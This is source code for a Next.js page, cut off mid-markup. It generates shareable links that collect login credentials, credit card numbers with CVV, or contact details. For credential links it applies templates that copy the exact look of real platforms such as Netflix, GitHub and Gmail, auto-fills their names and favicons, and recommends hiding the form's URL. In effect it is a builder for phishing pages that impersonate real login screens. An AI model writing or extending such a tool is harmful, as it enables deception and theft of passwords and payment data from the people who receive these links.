'use client'

import { useState, useEffect } from 'react'
import { useRouter } from 'next/navigation'
import { createClient } from '@/lib/supabase/client'
import { Button } from '@/components/ui/Button'
import { Input } from '@/components/ui/Input'
import { ItemType } from '@/types/vault.types'
import toast from 'react-hot-toast'
import { Copy, Check, Sparkles, Shield, Globe, Palette, Image as ImageIcon, Link as LinkIcon, Layout, Upload, Filter } from 'lucide-react'
import { getTemplateList, getTemplate, getTemplatesByCategory, TEMPLATE_CATEGORIES } from '@/lib/login-templates'

export default function AskForInfoPage() {
  const router = useRouter()
  const supabase = createClient()
  const [userId, setUserId] = useState<string | null>(null)
  const [itemType, setItemType] = useState<ItemType>('credential')
  const [linkType, setLinkType] = useState<'one-time' | 'multi-use'>('one-time')
  const [expiresIn, setExpiresIn] = useState(7) // days
  const [maxUses, setMaxUses] = useState(1)
  const [requiresAuth, setRequiresAuth] = useState(true)
  const [generatedLink, setGeneratedLink] = useState<string | null>(null)
  const [copied, setCopied] = useState(false)
  const [websiteUrl, setWebsiteUrl] = useState('')
  const [siteName, setSiteName] = useState('')
  const [siteTagline, setSiteTagline] = useState('')
  const [customFaviconUrl, setCustomFaviconUrl] = useState('')
  const [formBackground, setFormBackground] = useState('#ffffff')
  const [pageBackground, setPageBackground] = useState('#f3f4f6')
  const [buttonBackground, setButtonBackground] = useState('#ec4899')
  const [buttonTextColor, setButtonTextColor] = useState('#ffffff')
  const [buttonText, setButtonText] = useState('Submit')
  const [buttonAlignment, setButtonAlignment] = useState('center')
  const [labelTextColor, setLabelTextColor] = useState('')
  const [labelBackgroundColor, setLabelBackgroundColor] = useState('')
  const [inputBackgroundColor, setInputBackgroundColor] = useState('')
  const [inputTextColor, setInputTextColor] = useState('')
  const [inputBorderColor, setInputBorderColor] = useState('')
  const [iconBackgroundColor, setIconBackgroundColor] = useState('')
  const [formWidth, setFormWidth] = useState<number | ''>('')
  const [inputHeight, setInputHeight] = useState('56px')
  const [inputPadding, setInputPadding] = useState('16px 20px')
  const [formGap, setFormGap] = useState('24px')
  const [inputBorderRadius, setInputBorderRadius] = useState('16px')
  const [inputBorderWidth, setInputBorderWidth] = useState('2px')
  const [labelMarginBottom, setLabelMarginBottom] = useState('8px')
  const [inputFontSize, setInputFontSize] = useState('16px')
  const [stylePreset, setStylePreset] = useState('default')
  const [templateStyle, setTemplateStyle] = useState('custom')
  const [templateCategory, setTemplateCategory] = useState('all')
  const [pageBackgroundType, setPageBackgroundType] = useState('color')
  const [pageBackgroundImageUrl, setPageBackgroundImageUrl] = useState('')
  const [showUrlOnForm, setShowUrlOnForm] = useState(false)
  const [buttonBorderRadius, setButtonBorderRadius] = useState('16px')
  const [buttonHeight, setButtonHeight] = useState('48px')

  useEffect(() => {
    const getUser = async () => {
      const { data: { user } } = await supabase.auth.getUser()
      if (!user) {
        router.push('/auth/login')
        return
      }
      setUserId(user.id)
    }
    getUser()
  }, [router, supabase])

  // Apply template styles - COMPLETE styling to match platform exactly
  const applyTemplate = (templateId: string) => {
    setTemplateStyle(templateId)
    const template = getTemplate(templateId)
    
    if (templateId !== 'custom') {
      // Apply ALL layout settings
      setFormWidth(parseInt(template.layout.formWidth))
      setInputHeight(template.layout.inputHeight)
      setInputPadding(template.layout.inputPadding)
      setFormGap(template.layout.formGap)
      setInputBorderRadius(template.layout.inputBorderRadius)
      setInputBorderWidth(template.layout.inputBorderWidth)
      setInputFontSize(template.layout.fontSize)
      setLabelMarginBottom('8px')
      
      // Apply ALL colors from template
      setFormBackground(template.colors.formBackground)
      setPageBackground(template.colors.background)
      setButtonBackground(template.colors.buttonBackground)
      setButtonTextColor(template.colors.buttonText)
      setInputBackgroundColor(template.colors.inputBackground)
      setInputTextColor(template.colors.inputText)
      setInputBorderColor(template.colors.inputBorder)
      
      // Apply label colors (match input text color for consistency)
      setLabelTextColor(template.colors.text)
      setLabelBackgroundColor('') // No background by default
      
      // Apply icon background color (use primary color)
      setIconBackgroundColor(template.colors.primary)
      
      // Button styling - exact from template
      setButtonText('Sign In')
      setButtonAlignment('center')
      setButtonBorderRadius(template.layout.buttonBorderRadius)
      setButtonHeight(template.layout.buttonHeight || template.layout.inputHeight)
      
      // Apply branding - AUTO-FILL site name, tagline, website URL, and favicon!
      setSiteName(template.branding.siteName)
      setSiteTagline(template.branding.siteTagline || '')
      setWebsiteUrl(template.branding.websiteUrl)
      setCustomFaviconUrl(template.branding.faviconUrl)
      
      toast.success(`✓ ${template.name} template applied - All branding auto-filled!`)
    }
  }

  // Apply style presets
  const applyStylePreset = (preset: string) => {
    setStylePreset(preset)
    switch (preset) {
      case 'compact':
        setInputHeight('44px')
        setInputPadding('10px 14px')
        setFormGap('16px')
        setInputBorderRadius('8px')
        setInputBorderWidth('1px')
        setLabelMarginBottom('6px')
        setInputFontSize('14px')
        break
      case 'default':
        setInputHeight('56px')
        setInputPadding('16px 20px')
        setFormGap('24px')
        setInputBorderRadius('16px')
        setInputBorderWidth('2px')
        setLabelMarginBottom('8px')
        setInputFontSize('16px')
        break
      case 'spacious':
        setInputHeight('64px')
        setInputPadding('20px 24px')
        setFormGap('32px')
        setInputBorderRadius('20px')
        setInputBorderWidth('2px')
        setLabelMarginBottom('12px')
        setInputFontSize('18px')
        break
      case 'minimal':
        setInputHeight('48px')
        setInputPadding('12px 16px')
        setFormGap('20px')
        setInputBorderRadius('6px')
        setInputBorderWidth('1px')
        setLabelMarginBottom('8px')
        setInputFontSize('15px')
        break
    }
  }

  const handleGenerateLink = async () => {
    if (!userId) return

    try {
      const expiresAt = new Date()
      expiresAt.setDate(expiresAt.getDate() + expiresIn)

      // Determine allowed fields based on item type
      const allowedFields: string[] = []
      if (itemType === 'card') {
        allowedFields.push('cardNumber', 'expirationDate', 'cvv', 'cardholderName')
      } else if (itemType === 'credential') {
        allowedFields.push('username', 'email', 'password', 'website')
      } else if (itemType === 'contact') {
        allowedFields.push('fullName', 'email', 'phone', 'addressLine1', 'addressLine2', 'city', 'state', 'zipCode', 'country')
      }

      // Fetch logo from website URL if provided
      let logoUrl = null
      if (itemType === 'credential' && websiteUrl) {
        try {
          // Try to get favicon/logo from the website
          const domain = new URL(websiteUrl.startsWith('http') ? websiteUrl : `https://${websiteUrl}`).hostname
          logoUrl = `https://www.google.com/s2/favicons?domain=${domain}&sz=128`
        } catch (e) {
          console.error('Error parsing URL:', e)
        }
      }

      const { data, error } = await supabase
        .from('collection_links')
        .insert({
          owner_id: userId,
          link_type: linkType,
          item_type: itemType,
          allowed_fields: allowedFields,
          expires_at: expiresAt.toISOString(),
          max_uses: linkType === 'one-time' ? 1 : maxUses,
          requires_auth: requiresAuth,
          website_url: itemType === 'credential' ? websiteUrl : null,
          logo_url: logoUrl,
          site_name: siteName || null,
          site_tagline: siteTagline || null,
          custom_favicon_url: customFaviconUrl || null,
          form_background_color: formBackground,
          page_background_color: pageBackground,
          button_background_color: buttonBackground,
          button_text_color: buttonTextColor,
          button_text: buttonText,
          button_alignment: buttonAlignment,
          label_text_color: labelTextColor || null,
          label_background_color: labelBackgroundColor || null,
          input_background_color: inputBackgroundColor || null,
          input_text_color: inputTextColor || null,
          input_border_color: inputBorderColor || null,
          icon_background_color: iconBackgroundColor || null,
          input_height: inputHeight || '56px',
          input_padding: inputPadding || '16px 20px',
          form_gap: formGap || '24px',
          input_border_radius: inputBorderRadius || '16px',
          input_border_width: inputBorderWidth || '2px',
          label_margin_bottom: labelMarginBottom || '8px',
          input_font_size: inputFontSize || '16px',
          template_style: templateStyle || 'custom',
          page_background_type: pageBackgroundType || 'color',
          page_background_image_url: pageBackgroundImageUrl || null,
          show_url_on_form: showUrlOnForm,
          button_border_radius: buttonBorderRadius || '16px',
          button_height: buttonHeight || '48px',
          ...(formWidth ? { form_width: parseInt(formWidth.toString()) } : {}),
        })
        .select()
        .single()

      if (error) throw error

      const link = `${window.location.origin}/collect/${data.id}`
      setGeneratedLink(link)

      toast.success('Collection link created successfully')
    } catch (error: any) {
      console.error('Error creating link:', error)
      toast.error(error.message || 'Failed to create collection link')
    }
  }

  const handleCopy = async () => {
    if (!generatedLink) return
    await navigator.clipboard.writeText(generatedLink)
    setCopied(true)
    toast.success('Link copied to clipboard')
    setTimeout(() => setCopied(false), 2000)
  }

  if (!userId) {
    return <div className="flex items-center justify-center py-12">
      <div className="w-8 h-8 border-4 border-purple-600 border-t-transparent rounded-full animate-spin"></div>
    </div>
  }

  return (
    <div className="max-w-3xl mx-auto">
      <div className="mb-6">
        <h1 className="text-3xl font-bold text-gray-900 dark:text-white mb-2">Ask for Info</h1>
        <p className="text-gray-600 dark:text-gray-400">Create a secure link to request information from others</p>
      </div>
      
      <div className="bg-white dark:bg-slate-800 rounded-2xl shadow-lg border border-gray-200 dark:border-slate-700 p-6 space-y-6">
        {/* Header */}
        <div className="flex items-center gap-3 pb-4 border-b border-gray-200 dark:border-slate-700">
          <div className="w-10 h-10 bg-gradient-to-br from-purple-500 to-blue-500 rounded-xl flex items-center justify-center">
            <Sparkles className="text-white" size={20} />
          </div>
          <div>
            <h2 className="text-xl font-bold text-gray-900 dark:text-white">Collection Link Settings</h2>
            <p className="text-sm text-gray-500 dark:text-gray-400">Configure your secure request link</p>
          </div>
        </div>

        <div className="space-y-6">
          <div>
            <label className="block text-sm font-semibold text-gray-700 dark:text-gray-300 mb-2">
              <Globe className="inline mr-2" size={16} />
              What type of information do you want to collect?
            </label>
            <select
              value={itemType}
              onChange={(e) => setItemType(e.target.value as ItemType)}
              className="w-full px-4 py-3 bg-gray-50 dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all text-gray-900 dark:text-white"
            >
              <option value="credential">Login Credentials</option>
              <option value="card">Credit Card</option>
              <option value="contact">Contact Information</option>
            </select>
          </div>

          <div>
            <label className="block text-sm font-semibold text-gray-700 dark:text-gray-300 mb-3">
              Link Type
            </label>
            <div className="flex gap-4">
              <label className="flex items-center cursor-pointer">
                <input
                  type="radio"
                  value="one-time"
                  checked={linkType === 'one-time'}
                  onChange={(e) => setLinkType(e.target.value as 'one-time' | 'multi-use')}
                  className="mr-2"
                />
                <span className="text-gray-700 dark:text-gray-300">One-time use</span>
              </label>
              <label className="flex items-center cursor-pointer">
                <input
                  type="radio"
                  value="multi-use"
                  checked={linkType === 'multi-use'}
                  onChange={(e) => setLinkType(e.target.value as 'one-time' | 'multi-use')}
                  className="mr-2"
                />
                <span className="text-gray-700 dark:text-gray-300">Multi-use</span>
              </label>
            </div>
          </div>

          {linkType === 'multi-use' && (
            <Input
              label="Maximum Uses"
              type="number"
              min="1"
              value={maxUses}
              onChange={(e) => setMaxUses(parseInt(e.target.value) || 1)}
            />
          )}

          <Input
            label="Expires In (days)"
            type="number"
            min="1"
            max="90"
            value={expiresIn}
            onChange={(e) => setExpiresIn(parseInt(e.target.value) || 7)}
          />

          {itemType === 'credential' && (
            <div className="pt-4 border-t border-gray-200 dark:border-slate-700">
              <label className="block text-sm font-semibold text-gray-700 dark:text-gray-300 mb-4 flex items-center gap-2">
                <Layout size={16} className="text-pink-500" />
                Login Form Template
              </label>
              
              <div className="mb-4 p-3 bg-gradient-to-r from-blue-50 to-purple-50 dark:from-blue-900/20 dark:to-purple-900/20 rounded-lg border border-blue-200 dark:border-blue-800">
                <p className="text-xs font-medium text-blue-900 dark:text-blue-200 mb-1">
                  ✨ 20+ Platform-Specific Templates Available
                </p>
                <p className="text-xs text-blue-700 dark:text-blue-300">
                  Each template replicates the exact design of real platforms - perfect colors, spacing, and styling
                </p>
              </div>

              {/* Category Filter */}
              <div className="mb-4">
                <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-3 flex items-center gap-2">
                  <Filter size={14} />
                  Filter by Category
                </label>
                <div className="flex flex-wrap gap-2">
                  {TEMPLATE_CATEGORIES.map((cat) => (
                    <button
                      key={cat.id}
                      type="button"
                      onClick={() => setTemplateCategory(cat.id)}
                      className={`px-3 py-2 rounded-lg text-xs font-medium transition-all ${
                        templateCategory === cat.id
                          ? 'bg-purple-500 text-white shadow-md'
                          : 'bg-gray-100 dark:bg-slate-700 text-gray-700 dark:text-gray-300 hover:bg-gray-200 dark:hover:bg-slate-600'
                      }`}
                    >
                      <span className="mr-1">{cat.icon}</span>
                      {cat.name}
                    </button>
                  ))}
                </div>
              </div>

              {/* Templates Grid */}
              <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3 mb-4 max-h-96 overflow-y-auto p-1">
                {(templateCategory === 'all' 
                  ? getTemplateList() 
                  : getTemplatesByCategory(templateCategory)
                ).map((template) => (
                  <button
                    key={template.id}
                    type="button"
                    onClick={() => applyTemplate(template.id)}
                    className={`p-3 rounded-lg border-2 text-left transition-all hover:shadow-lg group ${
                      templateStyle === template.id
                        ? 'border-purple-500 bg-purple-50 dark:bg-purple-900/30 ring-2 ring-purple-400 shadow-lg'
                        : 'border-gray-300 dark:border-slate-600 bg-white dark:bg-slate-700 hover:border-purple-400 hover:scale-105'
                    }`}
                  >
                    <div className="flex items-center justify-between mb-2">
                      <span className="text-xs font-bold text-gray-900 dark:text-white">
                        {template.name}
                      </span>
                      {templateStyle === template.id && (
                        <Check size={14} className="text-purple-500" />
                      )}
                    </div>
                    <div className="flex items-center gap-1.5 mb-2">
                      <div 
                        className="w-3 h-3 rounded-full border border-gray-300" 
                        style={{ backgroundColor: template.colors.buttonBackground }}
                      />
                      <div 
                        className="w-3 h-3 rounded-full border border-gray-300" 
                        style={{ backgroundColor: template.colors.primary }}
                      />
                      <div 
                        className="w-3 h-3 rounded-full border border-gray-300" 
                        style={{ backgroundColor: template.colors.inputBorder }}
                      />
                    </div>
                    <p className="text-xs text-gray-500 dark:text-gray-400">
                      {template.platform}
                    </p>
                  </button>
                ))}
              </div>

              {templateStyle !== 'custom' && (
                <div className="p-3 bg-green-50 dark:bg-green-900/20 rounded-lg border border-green-200 dark:border-green-800">
                  <div className="flex items-start gap-2">
                    <Check size={16} className="text-green-600 dark:text-green-400 mt-0.5" />
                    <div>
                      <p className="text-xs font-semibold text-green-800 dark:text-green-300 mb-1">
                        {getTemplate(templateStyle).name} Template Applied!
                      </p>
                      <p className="text-xs text-green-700 dark:text-green-400">
                        Exact colors and styling from {getTemplate(templateStyle).platform}. You can still customize below.
                      </p>
                    </div>
                  </div>
                </div>
              )}
            </div>
          )}

          {itemType === 'credential' && (
            <div className="space-y-4 p-4 bg-gradient-to-br from-purple-50 to-pink-50 dark:from-slate-800 dark:to-slate-800 rounded-xl border border-purple-200 dark:border-slate-700">
              <div className="flex items-center gap-2 mb-2">
                <Sparkles size={18} className="text-purple-600 dark:text-purple-400" />
                <h3 className="text-sm font-bold text-gray-900 dark:text-white">Site Branding (Optional)</h3>
              </div>
              <p className="text-xs text-gray-600 dark:text-gray-400 mb-3">
                Make your collection link look like the actual website you're requesting credentials for
              </p>
              
              <div>
                <label className="block text-xs font-medium text-gray-700 dark:text-gray-300 mb-2">
                  Site Name
                </label>
                <input
                  type="text"
                  value={siteName}
                  onChange={(e) => setSiteName(e.target.value)}
                  placeholder="e.g., Netflix, GitHub, Gmail"
                  className="w-full px-4 py-3 bg-white dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all text-gray-900 dark:text-white"
                />
              </div>

              <div>
                <label className="block text-xs font-medium text-gray-700 dark:text-gray-300 mb-2">
                  Site Tagline
                </label>
                <input
                  type="text"
                  value={siteTagline}
                  onChange={(e) => setSiteTagline(e.target.value)}
                  placeholder="e.g., Sign in to your account"
                  className="w-full px-4 py-3 bg-white dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all text-gray-900 dark:text-white"
                />
              </div>

              <div>
                <label className="block text-xs font-medium text-gray-700 dark:text-gray-300 mb-2 flex items-center gap-2">
                  <LinkIcon size={14} className="text-pink-500" />
                  Website URL (for automatic logo)
                </label>
                <input
                  type="url"
                  value={websiteUrl}
                  onChange={(e) => setWebsiteUrl(e.target.value)}
                  placeholder="https://example.com"
                  className="w-full px-4 py-3 bg-white dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all text-gray-900 dark:text-white"
                />
                <p className="text-xs text-gray-500 dark:text-gray-400 mt-1">
                  Logo will be fetched automatically from this URL
                </p>
              </div>

              <div>
                <label className="block text-xs font-medium text-gray-700 dark:text-gray-300 mb-2 flex items-center gap-2">
                  <ImageIcon size={14} className="text-pink-500" />
                  Custom Favicon URL (Optional)
                </label>
                <input
                  type="url"
                  value={customFaviconUrl}
                  onChange={(e) => setCustomFaviconUrl(e.target.value)}
                  placeholder="https://example.com/favicon.ico"
                  className="w-full px-4 py-3 bg-white dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all text-gray-900 dark:text-white"
                />
                <p className="text-xs text-gray-500 dark:text-gray-400 mt-1">
                  Override auto-fetched logo with a custom favicon URL
                </p>
              </div>
            </div>
          )}

          {itemType === 'credential' && (
            <div className="pt-4 border-t border-gray-200 dark:border-slate-700">
              <label className="block text-sm font-semibold text-gray-700 dark:text-gray-300 mb-4 flex items-center gap-2">
                <Globe size={16} className="text-pink-500" />
                Background Options
              </label>
              
              <div className="space-y-4">
                <div>
                  <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-3">
                    Background Type
                  </label>
                  <div className="flex gap-3">
                    <label className="flex-1 cursor-pointer">
                      <input
                        type="radio"
                        value="color"
                        checked={pageBackgroundType === 'color'}
                        onChange={(e) => setPageBackgroundType(e.target.value)}
                        className="sr-only peer"
                      />
                      <div className="px-4 py-3 border-2 rounded-lg text-center transition-all peer-checked:border-purple-500 peer-checked:bg-purple-50 dark:peer-checked:bg-purple-900/20 border-gray-300 dark:border-slate-600 bg-white dark:bg-slate-700">
                        <Palette size={18} className="mx-auto mb-1 text-gray-600 dark:text-gray-400 peer-checked:text-purple-500" />
                        <span className="text-sm font-medium text-gray-700 dark:text-gray-300">Solid Color</span>
                      </div>
                    </label>
                    <label className="flex-1 cursor-pointer">
                      <input
                        type="radio"
                        value="image"
                        checked={pageBackgroundType === 'image'}
                        onChange={(e) => setPageBackgroundType(e.target.value)}
                        className="sr-only peer"
                      />
                      <div className="px-4 py-3 border-2 rounded-lg text-center transition-all peer-checked:border-purple-500 peer-checked:bg-purple-50 dark:peer-checked:bg-purple-900/20 border-gray-300 dark:border-slate-600 bg-white dark:bg-slate-700">
                        <ImageIcon size={18} className="mx-auto mb-1 text-gray-600 dark:text-gray-400 peer-checked:text-purple-500" />
                        <span className="text-sm font-medium text-gray-700 dark:text-gray-300">Background Image</span>
                      </div>
                    </label>
                  </div>
                </div>

                {pageBackgroundType === 'image' && (
                  <div>
                    <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-2 flex items-center gap-2">
                      <Upload size={14} />
                      Background Image URL
                    </label>
                    <input
                      type="url"
                      value={pageBackgroundImageUrl}
                      onChange={(e) => setPageBackgroundImageUrl(e.target.value)}
                      placeholder="https://example.com/background.jpg"
                      className="w-full px-4 py-2 bg-gray-50 dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-lg text-sm text-gray-900 dark:text-white"
                    />
                    <p className="text-xs text-gray-500 dark:text-gray-400 mt-1">
                      Use a high-resolution image for best results
                    </p>
                  </div>
                )}

                <div className="p-3 bg-amber-50 dark:bg-amber-900/20 rounded-lg border border-amber-200 dark:border-amber-800">
                  <label className="flex items-start cursor-pointer">
                    <input
                      type="checkbox"
                      checked={showUrlOnForm}
                      onChange={(e) => setShowUrlOnForm(e.target.checked)}
                      className="mt-0.5 mr-3"
                    />
                    <div className="flex-1">
                      <div className="flex items-center gap-2 mb-1">
                        <span className="text-xs font-semibold text-gray-900 dark:text-white">
                          Show Website URL on Form
                        </span>
                      </div>
                      <p className="text-xs text-gray-600 dark:text-gray-400">
                        {showUrlOnForm 
                          ? "URL will be visible below the logo. For security, it's recommended to keep this off."
                          : "URL will be hidden. Only the logo will appear above the form (recommended)."}
                      </p>
                    </div>
                  </label>
                </div>
              </div>
            </div>
          )}

          <div className="pt-4 border-t border-gray-200 dark:border-slate-700">
            <label className="block text-sm font-semibold text-gray-700 dark:text-gray-300 mb-4 flex items-center gap-2">
              <Palette size={16} className="text-pink-500" />
              Customize Appearance
            </label>
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-2">
                  Form Background
                </label>
                <div className="flex items-center gap-2">
                  <input
                    type="color"
                    value={formBackground}
                    onChange={(e) => setFormBackground(e.target.value)}
                    className="w-12 h-12 rounded-lg border-2 border-gray-300 dark:border-slate-600 cursor-pointer"
                  />
                  <input
                    type="text"
                    value={formBackground}
                    onChange={(e) => setFormBackground(e.target.value)}
                    className="flex-1 px-3 py-2 bg-gray-50 dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-lg text-sm text-gray-900 dark:text-white"
                    placeholder="#ffffff"
                  />
                </div>
              </div>
              <div>
                <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-2">
                  Page Background
                </label>
                <div className="flex items-center gap-2">
                  <input
                    type="color"
                    value={pageBackground}
                    onChange={(e) => setPageBackground(e.target.value)}
                    className="w-12 h-12 rounded-lg border-2 border-gray-300 dark:border-slate-600 cursor-pointer"
                  />
                  <input
                    type="text"
                    value={pageBackground}
                    onChange={(e) => setPageBackground(e.target.value)}
                    className="flex-1 px-3 py-2 bg-gray-50 dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-lg text-sm text-gray-900 dark:text-white"
                    placeholder="#f3f4f6"
                  />
                </div>
              </div>
            </div>
          </div>

          <div className="pt-4 border-t border-gray-200 dark:border-slate-700">
            <label className="block text-sm font-semibold text-gray-700 dark:text-gray-300 mb-4 flex items-center gap-2">
              <Palette size={16} className="text-pink-500" />
              Customize Submit Button
            </label>
            <div className="space-y-4">
              <div>
                <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-2">
                  Button Text
                </label>
                <input
                  type="text"
                  value={buttonText}
                  onChange={(e) => setButtonText(e.target.value)}
                  className="w-full px-4 py-2 bg-gray-50 dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-lg text-sm text-gray-900 dark:text-white"
                  placeholder="Submit"
                />
              </div>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-2">
                    Button Background
                  </label>
                  <div className="flex items-center gap-2">
                    <input
                      type="color"
                      value={buttonBackground}
                      onChange={(e) => setButtonBackground(e.target.value)}
                      className="w-12 h-12 rounded-lg border-2 border-gray-300 dark:border-slate-600 cursor-pointer"
                    />
                    <input
                      type="text"
                      value={buttonBackground}
                      onChange={(e) => setButtonBackground(e.target.value)}
                      className="flex-1 px-3 py-2 bg-gray-50 dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-lg text-sm text-gray-900 dark:text-white"
                      placeholder="#ec4899"
                    />
                  </div>
                </div>
                <div>
                  <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-2">
                    Button Text Color
                  </label>
                  <div className="flex items-center gap-2">
                    <input
                      type="color"
                      value={buttonTextColor}
                      onChange={(e) => setButtonTextColor(e.target.value)}
                      className="w-12 h-12 rounded-lg border-2 border-gray-300 dark:border-slate-600 cursor-pointer"
                    />
                    <input
                      type="text"
                      value={buttonTextColor}
                      onChange={(e) => setButtonTextColor(e.target.value)}
                      className="flex-1 px-3 py-2 bg-gray-50 dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-lg text-sm text-gray-900 dark:text-white"
                      placeholder="#ffffff"
                    />
                  </div>
                </div>
              </div>
              <div>
                <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-2">
                  Button Alignment
                </label>
                <select
                  value={buttonAlignment}
                  onChange={(e) => setButtonAlignment(e.target.value)}
                  className="w-full px-4 py-2 bg-gray-50 dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-lg text-sm text-gray-900 dark:text-white"
                >
                  <option value="left">Left</option>
                  <option value="center">Center</option>
                  <option value="right">Right</option>
                  <option value="full">Full Width</option>
                </select>
              </div>
            </div>
          </div>

          <div className="pt-4 border-t border-gray-200 dark:border-slate-700">
            <label className="block text-sm font-semibold text-gray-700 dark:text-gray-300 mb-4 flex items-center gap-2">
              <Palette size={16} className="text-pink-500" />
              Customize Form Fields
            </label>
            <div className="space-y-4">
              <div>
                <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-2">
                  Form Width (px) - Leave empty for default
                </label>
                <input
                  type="number"
                  value={formWidth}
                  onChange={(e) => setFormWidth(e.target.value ? parseInt(e.target.value) : '')}
                  className="w-full px-4 py-2 bg-gray-50 dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-lg text-sm text-gray-900 dark:text-white"
                  placeholder="e.g., 600 (default: 672px)"
                  min="300"
                  max="1200"
                />
              </div>
              
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-2">
                    Label Text Color
                  </label>
                  <div className="flex items-center gap-2">
                    <input
                      type="color"
                      value={labelTextColor || '#374151'}
                      onChange={(e) => setLabelTextColor(e.target.value)}
                      className="w-12 h-12 rounded-lg border-2 border-gray-300 dark:border-slate-600 cursor-pointer"
                    />
                    <input
                      type="text"
                      value={labelTextColor}
                      onChange={(e) => setLabelTextColor(e.target.value)}
                      className="flex-1 px-3 py-2 bg-gray-50 dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-lg text-sm text-gray-900 dark:text-white"
                      placeholder="#374151"
                    />
                  </div>
                </div>
                <div>
                  <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-2">
                    Label Background Color
                  </label>
                  <div className="flex items-center gap-2">
                    <input
                      type="color"
                      value={labelBackgroundColor || '#ffffff'}
                      onChange={(e) => setLabelBackgroundColor(e.target.value)}
                      className="w-12 h-12 rounded-lg border-2 border-gray-300 dark:border-slate-600 cursor-pointer"
                    />
                    <input
                      type="text"
                      value={labelBackgroundColor}
                      onChange={(e) => setLabelBackgroundColor(e.target.value)}
                      className="flex-1 px-3 py-2 bg-gray-50 dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-lg text-sm text-gray-900 dark:text-white"
                      placeholder="Transparent (leave empty)"
                    />
                  </div>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-2">
                    Input Background Color
                  </label>
                  <div className="flex items-center gap-2">
                    <input
                      type="color"
                      value={inputBackgroundColor || '#f9fafb'}
                      onChange={(e) => setInputBackgroundColor(e.target.value)}
                      className="w-12 h-12 rounded-lg border-2 border-gray-300 dark:border-slate-600 cursor-pointer"
                    />
                    <input
                      type="text"
                      value={inputBackgroundColor}
                      onChange={(e) => setInputBackgroundColor(e.target.value)}
                      className="flex-1 px-3 py-2 bg-gray-50 dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-lg text-sm text-gray-900 dark:text-white"
                      placeholder="#f9fafb"
                    />
                  </div>
                </div>
                <div>
                  <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-2">
                    Input Text Color
                  </label>
                  <div className="flex items-center gap-2">
                    <input
                      type="color"
                      value={inputTextColor || '#111827'}
                      onChange={(e) => setInputTextColor(e.target.value)}
                      className="w-12 h-12 rounded-lg border-2 border-gray-300 dark:border-slate-600 cursor-pointer"
                    />
                    <input
                      type="text"
                      value={inputTextColor}
                      onChange={(e) => setInputTextColor(e.target.value)}
                      className="flex-1 px-3 py-2 bg-gray-50 dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-lg text-sm text-gray-900 dark:text-white"
                      placeholder="#111827"
                    />
                  </div>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-2">
                    Input Border Color
                  </label>
                  <div className="flex items-center gap-2">
                    <input
                      type="color"
                      value={inputBorderColor || '#d1d5db'}
                      onChange={(e) => setInputBorderColor(e.target.value)}
                      className="w-12 h-12 rounded-lg border-2 border-gray-300 dark:border-slate-600 cursor-pointer"
                    />
                    <input
                      type="text"
                      value={inputBorderColor}
                      onChange={(e) => setInputBorderColor(e.target.value)}
                      className="flex-1 px-3 py-2 bg-gray-50 dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-lg text-sm text-gray-900 dark:text-white"
                      placeholder="#d1d5db"
                    />
                  </div>
                </div>
                <div>
                  <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-2">
                    Icon Background Color
                  </label>
                  <div className="flex items-center gap-2">
                    <input
                      type="color"
                      value={iconBackgroundColor || '#ec4899'}
                      onChange={(e) => setIconBackgroundColor(e.target.value)}
                      className="w-12 h-12 rounded-lg border-2 border-gray-300 dark:border-slate-600 cursor-pointer"
                    />
                    <input
                      type="text"
                      value={iconBackgroundColor}
                      onChange={(e) => setIconBackgroundColor(e.target.value)}
                      className="flex-1 px-3 py-2 bg-gray-50 dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-lg text-sm text-gray-900 dark:text-white"
                      placeholder="#ec4899"
                    />
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="pt-4 border-t border-gray-200 dark:border-slate-700">
            <label className="block text-sm font-semibold text-gray-700 dark:text-gray-300 mb-4 flex items-center gap-2">
              <Palette size={16} className="text-pink-500" />
